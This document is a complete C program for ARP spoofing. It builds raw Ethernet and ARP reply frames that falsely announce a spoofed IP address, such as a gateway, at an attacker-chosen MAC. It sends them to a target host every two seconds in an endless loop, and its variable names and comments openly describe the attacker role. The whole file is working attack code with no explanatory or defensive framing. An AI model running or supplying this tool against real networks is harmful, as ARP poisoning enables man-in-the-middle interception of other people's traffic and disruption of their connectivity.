#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <errno.h>

// Define ether_arp if not available
#ifndef HAVE_STRUCT_ETHER_ARP
struct ether_arp {
    struct arphdr ea_hdr;
    unsigned char arp_sha[6]; // sender hardware address
    unsigned char arp_spa[4]; // sender protocol address
    unsigned char arp_tha[6]; // target hardware address
    unsigned char arp_tpa[4]; // target protocol address
};
#endif

#define ETH_HDRLEN 14
#define ARP_HDRLEN 28

// Function to get the MAC address of the interface
int get_interface_mac(const char *iface, unsigned char *mac) {
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return -1;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        close(fd);
        return -1;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
    return 0;
}

// Function to get the IP address of the interface
int get_interface_ip(const char *iface, struct in_addr *ip) {
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return -1;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
        close(fd);
        return -1;
    }
    *ip = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
    close(fd);
    return 0;
}

// Function to print MAC address
void print_mac(const unsigned char *mac) {
    printf("%02x:%02x:%02x:%02x:%02x:%02x\n",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s <interface> <target_ip> <target_mac> <spoof_ip> <spoof_mac>\n", argv[0]);
        printf("Example: %s eth0 192.168.1.5 aa:bb:cc:dd:ee:ff 192.168.1.1 11:22:33:44:55:66\n", argv[0]);
        return 1;
    }

    const char *iface = argv[1];
    const char *target_ip_str = argv[2];
    const char *target_mac_str = argv[3];
    const char *spoof_ip_str = argv[4];
    const char *spoof_mac_str = argv[5];

    unsigned char target_mac[6], spoof_mac[6], attacker_mac[6];
    struct in_addr target_ip, spoof_ip, attacker_ip;

    // Parse MAC addresses
    sscanf(target_mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &target_mac[0], &target_mac[1], &target_mac[2],
           &target_mac[3], &target_mac[4], &target_mac[5]);
    sscanf(spoof_mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &spoof_mac[0], &spoof_mac[1], &spoof_mac[2],
           &spoof_mac[3], &spoof_mac[4], &spoof_mac[5]);

    // Parse IP addresses
    inet_pton(AF_INET, target_ip_str, &target_ip);
    inet_pton(AF_INET, spoof_ip_str, &spoof_ip);

    // Get attacker's MAC and IP
    if (get_interface_mac(iface, attacker_mac) < 0) {
        perror("get_interface_mac");
        return 1;
    }
    if (get_interface_ip(iface, &attacker_ip) < 0) {
        perror("get_interface_ip");
        return 1;
    }

    // Create raw socket
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sockfd < 0) {
        perror("socket");
        return 1;
    }

    // Get interface index
    struct ifreq if_idx;
    memset(&if_idx, 0, sizeof(struct ifreq));
    strncpy(if_idx.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
        perror("SIOCGIFINDEX");
        close(sockfd);
        return 1;
    }

    // Build Ethernet header
    unsigned char buffer[ETH_HDRLEN + ARP_HDRLEN];
    struct ethhdr *eth = (struct ethhdr *)buffer;
    memcpy(eth->h_dest, target_mac, 6);
    memcpy(eth->h_source, attacker_mac, 6);
    eth->h_proto = htons(ETH_P_ARP);

    // Build ARP header
    struct ether_arp *arp = (struct ether_arp *)(buffer + ETH_HDRLEN);
    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETH_P_IP);
    arp->ea_hdr.ar_hln = 6;
    arp->ea_hdr.ar_pln = 4;
    arp->ea_hdr.ar_op  = htons(ARPOP_REPLY);

    memcpy(arp->arp_sha, spoof_mac, 6); // Spoofed MAC (pretend to be gateway)
    memcpy(arp->arp_spa, &spoof_ip, 4); // Spoofed IP (pretend to be gateway)
    memcpy(arp->arp_tha, target_mac, 6); // Target MAC
    memcpy(arp->arp_tpa, &target_ip, 4); // Target IP

    // Prepare sockaddr_ll
    struct sockaddr_ll socket_address;
    memset(&socket_address, 0, sizeof(struct sockaddr_ll));
    socket_address.sll_ifindex = if_idx.ifr_ifindex;
    socket_address.sll_halen = ETH_ALEN;
    memcpy(socket_address.sll_addr, target_mac, 6);

    printf("Sending ARP spoof packet...\n");
    while (1) {
        if (sendto(sockfd, buffer, ETH_HDRLEN + ARP_HDRLEN, 0,
                   (struct sockaddr*)&socket_address, sizeof(socket_address)) < 0) {
            perror("sendto");
        } else {
            printf("Sent ARP reply: %s is-at ", spoof_ip_str);
            print_mac(spoof_mac);
        }
        sleep(2); // Send every 2 seconds
    }

    close(sockfd);
    return 0;
}